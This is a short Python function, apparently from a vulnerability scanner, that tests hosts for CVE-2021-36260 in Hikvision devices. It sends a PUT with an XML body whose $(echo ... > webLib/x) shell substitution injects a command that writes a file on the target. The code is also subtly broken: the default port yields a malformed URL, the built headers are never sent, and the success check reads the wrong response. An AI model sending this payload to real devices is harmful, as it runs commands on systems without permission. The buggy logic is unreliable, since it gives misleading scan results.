import requests
from intrack.lib.headers.headers_handler import user_agents
from intrack.lib.color_handler import print_colour

def check_CVE_2021_36260(ip, ports=None, timeout=5):
    headers = {"User-Agent": user_agents()}
    data = '''<?xml version="1.0" encoding="UTF-8"?><language>$(echo GSHWHJDjhwhdJHDWjwhdHikVissopndJHXBWGDAUWDGGGGGGGGGGGGGG>webLib/x)</language>'''
    protocols = ["http", "https"]
    if ports is None:
        ports = [80]
    else:
        ports = [f":{port}" for port in ports]
    for protocol in protocols:
        for port in ports:
            url = f"{protocol}://{ip}{port}/SDK/webLanguage"
            try:
                response = requests.put(url, data=data, timeout=timeout, verify=False)
                if "GSHWHJDjhwhdJHDWjwhdHikVissopndJHXBWGDAUWDGGGGGGGGGGGGGG" in response.text:
                    print_colour(f"[+] The target is vulnerable to CVE-2021-36260 : {url}")
                    return True
            except requests.RequestException:
                continue
    return False
